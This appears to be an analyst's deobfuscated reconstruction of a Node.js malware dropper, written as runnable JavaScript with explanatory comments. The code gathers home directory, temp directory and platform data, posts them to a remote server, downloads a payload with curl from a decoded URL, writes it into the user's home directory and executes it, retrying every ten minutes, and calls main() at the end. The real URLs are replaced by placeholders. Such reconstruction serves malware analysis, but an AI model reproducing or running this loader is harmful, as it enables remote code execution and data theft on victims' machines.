/*
 * === DEOBFUSCATED VERSION (READ-ONLY) ===
 *
 * WARNING: This code appears to be a dropper/loader that may perform file system operations,
 * process execution, and network communication. Use extreme caution if you decide to run it.
 */

// --- Utility Functions ---

// A helper function to decode strings that have been base64–encoded and then had their first character removed.
function decodeObfuscatedString (obfStr) {
    // Remove the first character and decode from base64 using "base64" -> "utf8"
    const base64Str = obfStr.slice(1);
    return Buffer.from(base64Str, 'base64').toString('utf8');
}

// A helper for XOR–based decryption with a fixed key.
// (The key is defined as an array of numbers.)
function xorDecode (buffer) {
    const key = [0x24, 0xC0, 0x29, 0x08];
    let result = '';
    for (let i = 0; i < buffer.length; i++) {
        // XOR each byte with a repeating key
        result += String.fromCharCode(buffer[i] ^ key[i % key.length]);
    }
    return result;
}

// --- Module Imports and OS Information ---

const fs = require('fs');
const os = require('os');

// Instead of hardcoding module names, the original code builds them from obfuscated strings.
// For clarity we replace these with their likely meanings.
const childProcess = require(decodeObfuscatedString('cXXXX...')); // likely decodes to "child_process"
const pathModule = require(decodeObfuscatedString('zXXXX...')); // likely decodes to "path"

// The "exec" function is extracted from one module (originally via obf string "cZXhlYw")
const execFunction = require(decodeObfuscatedString('aXXXX...')).exec;

// Another module (purpose unclear) is loaded similarly:
const additionalModule = require(decodeObfuscatedString('ZXXXX...'));

// OS-related information
const homeDirectory = os.homedir();
const tempDirectory = os.tmpdir();
const platformInfo = os.platform();
const userInfo = os.userInfo();

// --- File and Directory Operations ---

// Create a directory recursively; if it exists, continue.
function ensureDirectory (dirPath) {
    try {
        fs.mkdirSync(dirPath, {recursive: true});
    } catch (err) {
        // If error occurs, likely the directory exists already.
    }
    return dirPath;
}

// Write content to a file and then (optionally) execute it.
function writeFileAndExecute (directory, fileName, content) {
    // Ensure directory exists
    const dir = ensureDirectory(directory);
    const fullPath = pathModule.join(dir, fileName);

    // Write file content
    fs.writeFile(fullPath, content, 'utf8', (writeErr) => {
        if (writeErr) {
            console.error('Error writing file:', writeErr);
            return;
        }
        // After writing, attempt to execute the file
        execFunction(`"${ fullPath }"`, (execErr, stdout, stderr) => {
            if (execErr) {
                console.error('Execution error:', execErr);
            }
        });
    });
}

// Remove a file or directory; used for cleanup.
function removePath (targetPath) {
    try {
        fs.rmSync(targetPath, {recursive: true, force: true});
    } catch (err) {
        // Ignore errors if removal fails.
    }
}

// --- Network and Remote Communication ---

// This function constructs a request and sends data to a remote server.
// (The actual URL and parameters are built from decoded strings and system info.)
async function sendRemoteRequest () {
    // Example: Build parameters from decoded strings and system information.
    const timestamp = Date.now().toString();
    const systemId = platformInfo; // This might be modified by additional logic in the original
    const requestParams = {
        ts: timestamp,
        type: 'someType',        // Derived from internal variables in the original code
        hid: systemId,
        ss: tempDirectory,       // Example system parameter
        cc: homeDirectory        // Another parameter
    };

    // Build the final request object.
    const requestBody = {
        // The key names below were built from decoded obfuscated strings.
        key1: '' + 'somePrefix' + '4',
        key2: requestParams
    };

    // Use the additional module’s method (e.g. an HTTP POST) to send the request.
    try {
        additionalModule.post(requestBody, (err, res, body) => {
            if (err) {
                console.error('Remote request error:', err);
            }
            // Optionally, process the response.
        });
    } catch (err) {
        console.error('Error sending remote request:', err);
    }
}

// --- Main Operation Functions ---

// This function combines file system operations and network communication.
// It may download further payloads, write them to disk, and execute them.
function processPayload (directory) {
    // Build a filename and content from internal decoding functions.
    // (The original concatenated strings using XOR and base64 decoders.)
    const fileIdentifier = 'prefix' + xorDecode([0x0B, 0xAA, 0x06]) + 'suffix';
    const filePath = pathModule.join(directory, fileIdentifier);

    // Remove any preexisting file at this path.
    removePath(filePath);

    // Use a request function to download content (payload) from a remote server.
    // The URL is built from decoded strings.
    const downloadUrl = decodeObfuscatedString('aXXXX...') + decodeObfuscatedString('bXXXX...');

    // Example: download payload (this uses the child process “exec” as a placeholder for an HTTP request)
    childProcess.exec(`curl "${ downloadUrl }"`, (err, stdout, stderr) => {
        if (err) {
            console.error('Error downloading payload:', err);
            return;
        }
        // Write the downloaded payload to disk and then execute it.
        writeFileAndExecute(directory, fileIdentifier, stdout);
    });
}

// The main async function schedules operations and may repeat them periodically.
async function main () {
    // Schedule the initial remote request and payload processing.
    try {
        await sendRemoteRequest();
        processPayload(homeDirectory);
    } catch (err) {
        console.error('Error in main operation:', err);
    }

    // Set up a repeated operation (e.g. retry every 10 minutes, up to 3 times)
    let attemptCount = 0;
    const maxAttempts = 3;
    const intervalId = setInterval(async () => {
        if (++attemptCount <= maxAttempts) {
            try {
                await sendRemoteRequest();
                processPayload(homeDirectory);
            } catch (err) {
                console.error('Error on scheduled attempt:', err);
            }
        } else {
            clearInterval(intervalId);
        }
    }, 10 * 60 * 1000);
}

// --- Start the Process ---
main();
